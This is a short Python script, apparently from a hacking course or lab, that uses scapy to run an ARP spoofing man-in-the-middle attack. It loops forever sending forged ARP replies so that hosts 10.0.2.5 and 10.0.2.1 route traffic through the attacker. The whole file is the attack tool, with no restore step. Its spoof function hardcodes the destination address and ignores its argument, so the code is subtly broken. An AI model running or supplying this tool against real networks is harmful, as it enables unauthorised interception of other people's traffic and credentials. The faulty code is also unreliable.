#!/usr/bin/env python

# arp doesn't have verification protocol
import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)  # create arp packet object (class)
    broadcast_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # create ether net frame
    broadcast_arp_request = broadcast_request / arp_request
    answered_list = scapy.srp(broadcast_arp_request, timeout=1, verbose=False)[0]  # srp for custom packet

    return answered_list[0][1].hwsrc    # target's mac address


# create arp response
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst="10.0.2.5", hwdst=target_mac, psrc=spoof_ip)   # hardware(mac address) destination
    # source is us
    scapy.send(packet, verbose=False)


sent_count = 0
try:
    while True:
        spoof("10.0.2.5", "10.0.2.1")
        spoof("10.0.2.1", "10.0.2.5")
        sent_count += 2
        print("\r[+] Sent Packet Count: " + str(sent_count), end="")    # if no end will duplicate the last line
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected intercept. Quiting ...")
